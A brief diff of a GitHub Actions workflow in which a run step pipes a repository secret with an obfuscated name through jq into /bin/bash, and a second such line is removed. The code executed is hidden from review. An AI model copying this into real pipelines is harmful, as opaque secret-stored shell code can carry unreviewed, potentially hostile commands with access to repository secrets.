@@ -21,7 +21,6 @@ jobs:
           vi901: ${{ secrets.vi901 }}
         run: |
           printf '%s' "$vi901" | jq -r .ez1845 | /bin/bash
-          echo $fq154 | jq -r .z74196 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
